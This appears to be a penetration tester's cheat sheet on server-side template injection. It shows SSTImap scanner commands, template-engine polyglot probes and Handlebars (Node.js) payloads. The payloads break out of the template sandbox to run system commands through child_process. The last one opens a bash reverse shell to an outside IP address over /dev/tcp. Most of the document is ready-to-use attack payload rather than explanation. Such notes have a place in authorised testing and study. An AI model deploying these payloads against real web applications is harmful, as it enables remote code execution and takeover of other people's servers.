# Server Side Template Injection
## Automated Tools
### TInjA
### SSTImap
```bash
python3 sstimap.py -i -l 5
```
```bash
python3 sstimap.py -u "http://example.com/" --crawl 5 --forms
```
```bash
python3 sstimap.py -u "https://example.com/page?name=John" -s
```
## Template Injection Table
An interactive table containing the most efficient template injection polyglots along with the expected responses of the 44 most important template engines.\
[Template Injection Table](https://cheatsheet.hackmanit.de/template-injection-table/index.html/)
### Error Polygot
The only polyglot that produces an error message for all 44 template engines examined. 
> [!WARNING]
> There is a possibility that errors will be caught by the web application in question, rendering error polyglots useless.
### Non-Error Polygots  
These are constructed in such a way that at **least one** of them does not throw an error, but renders the polyglot modified for all template engines we examined.
```content
">[[${{1}}]]
```
```content
<%=1%>@*#{1}
```
```content
{##}/*{{.}}*/
```
## Examples 
>[!NOTE]
>If a module isn't defined, then you must find a work around with global modules. CTRL+f to find other uses of the function in question.

>[!IMPORTANT]
>URL encode all fields before sending them via Burp's Repeater
### Reference
[HackTricks](https://book.hacktricks.xyz/)
### Node.js
#### Handlebars
Proof of Concept
```field
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
Proof of Concept (if require is not defined)
```field
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
Reverse Shell (if require is not defined)
```field
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.15.99/9001 0>&1\"');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```


